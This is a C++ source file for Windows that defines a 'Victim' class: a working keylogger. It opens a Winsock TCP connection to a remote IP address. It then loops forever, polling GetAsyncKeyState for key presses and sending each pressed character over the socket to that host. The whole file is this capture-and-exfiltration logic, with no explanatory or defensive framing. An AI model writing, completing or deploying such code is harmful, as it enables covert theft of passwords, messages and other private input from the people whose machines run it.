#include "Victim.h"

void Victim::recordAndSendKeys() {
	while (true) {
		for (char c = 2; c <= '~'; c++) {
			if (GetAsyncKeyState(c) == ACTIVE_PROMISE_CODE) {
				send(this->_connection_socket, &c, sizeof(c), NULL);
			}
		}
	}
}

Victim::Victim(std::string target_ip_addr)  {
	this->_target_ip_addr = target_ip_addr;
}

int Victim::connectToServer() {
	int res = 0;

	res = WSAStartup(MAKEWORD(2, 2), &this->_wsaData);
	if (res != 0) {
		std::cerr << "winsock initialization failed" << std::endl;
		return res;
	}

	_addr.sin_family = AF_INET;
	_addr.sin_port = htons(this->_connection_port);
	InetPtonA(AF_INET, this->_target_ip_addr.c_str(), &this->_addr.sin_addr.s_addr);

	this->_connection_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (this->_connection_socket == INVALID_SOCKET) {
		std::cerr << "Socket creation failed." << std::endl;
		WSACleanup();
		return -1;
	}

	std::cout << "Connecting to server" << std::endl;
	if (connect(this->_connection_socket, (SOCKADDR*)&this->_addr, sizeof(this->_addr)) == -1) {
		std::cerr << "Error while connecting to target." << std::endl;
		closesocket(this->_connection_socket);
		WSACleanup();
		return -1;
	}
	std::cout << "Connected to target.\nIP: " << this->_target_ip_addr << "\t" << "Port: " << this->_connection_port << std::endl;

	return 0;
}